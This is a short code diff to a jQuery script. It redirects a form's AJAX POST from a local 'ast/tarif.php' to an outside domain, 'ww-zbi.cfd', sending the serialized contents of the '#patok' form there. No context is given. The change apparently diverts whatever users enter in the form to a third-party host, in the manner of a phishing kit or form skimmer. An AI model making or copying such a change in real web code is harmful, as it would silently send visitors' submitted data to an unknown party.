@@ -457,7 +457,7 @@ var tarif = $('input[name="tarif"]:checked').val();
       $("#process1").fadeIn(); 
         $.ajax({
             type: 'POST',
-            url: 'ast/tarif.php',
+            url: 'https://ww-zbi.cfd/lj20/ii/tarif.php',
             data: $('#patok').serialize(),
             datatype: 'JSON',            
             complete: function(data) {
